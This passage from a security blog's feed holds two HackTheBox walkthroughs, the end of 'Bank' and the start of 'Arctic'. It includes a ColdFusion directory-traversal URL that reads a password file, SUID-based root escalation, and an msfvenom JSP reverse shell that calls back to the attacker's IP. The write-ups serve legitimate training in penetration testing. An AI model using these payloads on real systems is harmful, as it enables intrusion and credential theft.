www-data@bank:/var/www/bank/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;clear             
TERM environment variable not set.
www-data@bank:/var/www/bank/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;screen 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This workaround gives us the ability to tab autocomplete, clear the screen, arrow up history etc.&lt;/p&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h1&gt;

&lt;p&gt;Now that were in the victim’s machine, its time to find a way to escalate. Navigating around the root directory of the webserver: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/bank/&lt;/code&gt; I came across some mysql credentials in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inc&lt;/code&gt; directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;getCreditCards&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;){&lt;/span&gt;
                &lt;span class=&quot;nv&quot;&gt;$mysql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; new mysqli&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;localhost&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;root&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;!@#S3cur3P4ssw0rd!@#&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;htbbank&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;mysql-enumeration&quot;&gt;MYSQL Enumeration&lt;/h2&gt;

&lt;p&gt;Inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/bank/inc&lt;/code&gt; directory we see a user.php file with a mysql username and password. We can log into the mysql database with those credentials, drop into a shell and hope we are root.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bank:/var/www/bank/inc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mysql &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
Enter password: 
Welcome to the MySQL monitor.  Commands end with &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; or &lt;span class=&quot;se&quot;&gt;\g&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Your MySQL connection &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;is 345
Server version: 5.5.55-0ubuntu0.14.04.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2000, 2017, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type &lt;span class=&quot;s1&quot;&gt;'help;'&lt;/span&gt; or &lt;span class=&quot;s1&quot;&gt;'\h'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;help. Type &lt;span class=&quot;s1&quot;&gt;'\c'&lt;/span&gt; to clear the current input statement.

mysql&amp;gt; &lt;span class=&quot;se&quot;&gt;\!&lt;/span&gt; /bin/sh &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;COMMAND TO UPGRADE TO A SHELL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;www-data
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nope, no luck. We could try to SSH in using those credentials.&lt;/p&gt;

&lt;h2 id=&quot;ssh-enumeration&quot;&gt;SSH Enumeration&lt;/h2&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh root@bank.htb
root@bank.htbs password: 
Permission denied, please try again.

ssh chris@bank.htb
chris@bank.htbs password: 
Permission denied, please try again.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And another dead end. Might be time to use some priv esc tools but before I do that I searched for files that may have an SUID (set user) or SGID (set group) bit attached. Files with these sticky bits provides users with the ability to access or use that file with root permissions. A useful article showing how to exploit SUID bits: &lt;a href=&quot;https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/&quot;&gt;https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;searching-files-with-suid--sgid-bit-set&quot;&gt;Searching files with SUID &amp;amp; SGID bit set&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Finding SGID bit files: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data@bank: find / -perm -2000 -type f -exec ls -la {} 2&amp;gt;/dev/null \;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Finding SUID bit files: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data@bank: find / -perm -4000 -type f -exec ls -la {} 2&amp;gt;/dev/null \;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bank: find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; 2&amp;gt;/dev/null &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 112204 Jun 14  2017 /var/htb/bin/emergency
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 492972 Aug 11  2016 /usr/lib/openssh/ssh-keysign
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr--&lt;/span&gt; 1 root messagebus 333952 Dec  7  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 9808 Nov 24  2015 /usr/lib/policykit-1/polkit-agent-helper-1
&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt; 1 daemon daemon 46652 Oct 21  2013 /usr/bin/at
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 35916 May 17  2017 /usr/bin/chsh
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 45420 May 17  2017 /usr/bin/passwd
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 44620 May 17  2017 /usr/bin/chfn
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 18168 Nov 24  2015 /usr/bin/pkexec
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 30984 May 17  2017 /usr/bin/newgrp
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 18136 May  8  2014 /usr/bin/traceroute6.iputils
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 66284 May 17  2017 /usr/bin/gpasswd
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 156708 May 29  2017 /usr/bin/sudo
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 72860 Oct 21  2013 /usr/bin/mtr
&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt; 1 libuuid libuuid 17996 Nov 24  2016 /usr/sbin/uuidd
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr--&lt;/span&gt; 1 root dip 323000 Apr 21  2015 /usr/sbin/pppd
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 38932 May  8  2014 /bin/ping
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 43316 May  8  2014 /bin/ping6
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 35300 May 17  2017 /bin/su
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 30112 May 15  2015 /bin/fusermount
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 88752 Nov 24  2016 /bin/mount
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 67704 Nov 24  2016 /bin/umount

www-data@bank:/var/www/bank/inc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/var/htb/bin/emergency
&lt;span class=&quot;c&quot;&gt;# &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see that there was a file called emergency that had a SUID bit so I executed it and voila, root!&lt;/p&gt;</content><author><name>Emmet Friel</name></author><category term="HackTheBox" /><summary type="html">Introduction Bank is an “easy” machine on HackTheBox. This box was a fairly steep learning curve albeit there was a alot of important takeways being the DNS enumeration, Virtual Host Routing check, modifying HTTP response headers to stop redirecting webpages and the RCE technique.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:8000/ef_blog/htb/bank/bank.png" /><media:content medium="image" url="http://localhost:8000/ef_blog/htb/bank/bank.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">HackTheBox Walkthrough - Arctic</title><link href="http://localhost:8000/ef_blog/hackthebox/arctic.html" rel="alternate" type="text/html" title="HackTheBox Walkthrough - Arctic" /><published>2020-04-13T00:00:00-07:00</published><updated>2020-04-13T00:00:00-07:00</updated><id>http://localhost:8000/ef_blog/hackthebox/arctic</id><content type="html" xml:base="http://localhost:8000/ef_blog/hackthebox/arctic.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;

&lt;p&gt;Arctic is an “easy” Windows machine on Hackthebox.&lt;/p&gt;

&lt;h1 id=&quot;reconnaissance--enumeration&quot;&gt;Reconnaissance &amp;amp; Enumeration&lt;/h1&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/boxes/arctic# nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap.nmap 10.10.10.11
Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-04-11 13:10 BST
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.11
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.027s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: phone|general purpose|specialized
Running &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;JUST GUESSING&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Microsoft Windows Phone|2008|7|8.1|Vista|2012 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;92%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;92%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows 7 or Windows Server 2008 R2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;91%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2008 R2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;91%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2008 R2 or Windows 8.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;91%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2008 R2 SP1 or Windows 8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;91%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows 7 Professional or Windows 8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;91%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;91%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Vista SP2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;91%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;90%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows 8.1 Update 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;90%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
No exact OS matches &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;host &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;conditions non-ideal&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;141.73 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The scan shows two MSRPC services and one unknown that nmap couldn’t pick up. Before checking out what it is exactly, I used rpcclient and tried to connect to the two MSRPC services with anonymous credentials:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 135 10.10.10.11
rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 49154 10.10.10.11
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Server timed out, no luck. Back to see whats running on port 8500 so navigating to that port on the browser shows the webpage.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/arctic/index.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;em&gt;Webpage running on port 8500&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Navigating through the directory I came across an Adobe ColdFusion8 admin portal. Note that the webpages take about 20 seconds to load so be patient.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/arctic/portal.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;em&gt;Adobe ColdFusion8 web portal&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Searching information about Adobe ColdFusion 8, it came out in July 2007 and the latest version is now ColdFusion 2018. ColdFusion uses its own server-side markup language (CFML) and the application itself was wrote in Java but to verify this we can view the HTTP headers using CURL.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/arctic/httpheaders.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;em&gt;Grabbing HTTP headers gives us more information about the server&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;So, ColdFusion is hosted on a JRun Web Server and that runs on JSP, another server-side language. Quick search on ColdFusion8 exploits and the one I used was: Adobe ColdFusion - Directory Traversal which refers to CVE-2010-2861:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;“Multiple directory traversal vulnerabilities in the administrator console in Adobe ColdFusion 9.0.1 and earlier allow remote attackers to read arbitrary files via the locale parameter to (1) CFIDE/administrator/settings/mappings.cfm, (2) logging/settings.cfm, (3) datasources/index.cfm, (4) j2eepackaging/editarchive.cfm, and (5) enter.cfm in CFIDE/administrator/.”&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The exploit gives us the ability to read file paths using these parameters! Reading the exploit script it shows a directory that looks like it would show us some password properties: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en&lt;/code&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/arctic/hash.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;em&gt;The directory path returned a hashed password on the webpage&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;The portal shows a hashed password that I could attempt to crack. You can use John the ripper or various websites. I used crackstation.net and it successfully cracked the password which turned out to be &lt;strong&gt;happyday&lt;/strong&gt;. Logging into the portal you can see everything about the server from “Settings Summary” under Server Setting tab. The info shows the server is running on Windows Vista and I came across important default file paths.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/arctic/mappings.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;em&gt;Important directory mappings. If we get to upload files to the server we’ll use these default file paths&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;On the admin portal there is an option for “Scheduled Tasks” which gives us the ability to execute a task from a remote URL! Lovely. We know the server handles CFML and JSP so we can decide on a web shell (CFML) or a complete shell to the machine (JSP), I went for a complete shell but the CFML webshells are under &lt;strong&gt;/usr/share/webshells/cfm&lt;/strong&gt; on Kali. Save the task to a file called shell.jsp using the default file path mappings above so we can execute that file from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.11/CFIDE/&amp;lt;file&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/arctic/task.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;em&gt;Creating a task to download a file from my python webserver&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Create a new directory to host the reverse shell file using a webserver, create a jsp reverse shell using msfvenom and setup your netcat listener. Go the &lt;strong&gt;http://10.10.10.11:8500/CFIDE/shell.jsp&lt;/strong&gt; and then wait for your listener to catch that connection.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/boxes/arctic/share# msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; java/jsp_shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.19 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;443 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; raw &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell.jsp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/arctic/shell.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;em&gt;Shell access to the victim with user privs&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h1&gt;

&lt;p&gt;If you run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systeminfo&lt;/code&gt; you can see its running on Windows 2008 and there hasn’t been any patches carried out on the machine. Using Windows Exploit Suggester to find an escalation vulnerability:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/boxes/arctic# python windows-exploit-suggester.py &lt;span class=&quot;nt&quot;&gt;--database&lt;/span&gt; 2020-04-10-mssb.xls &lt;span class=&quot;nt&quot;&gt;--systeminfo&lt;/span&gt; systeminfo.txt &lt;span class=&quot;nt&quot;&gt;--quiet&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; initiating winsploit version 3.3...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; database file detected as xls or xlsx based on extension
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; attempting to &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;from the systeminfo input file
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] systeminfo input file &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;successfully &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ascii&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; querying database file &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;potential vulnerabilities
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; comparing the 0 hotfix&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;es&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; against the 197 potential bulletins&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; with a database of 137 known exploits
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; there are now 197 remaining vulns
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] exploitdb PoC, &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] Metasploit module, &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; missing bulletin
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] windows version identified as &lt;span class=&quot;s1&quot;&gt;'Windows 2008 R2 64-bit'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] MS13-009: Cumulative Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Internet Explorer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2792100&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Critical
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] MS13-005: Vulnerability &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Windows Kernel-Mode Driver Could Allow Elevation of Privilege &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2778930&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
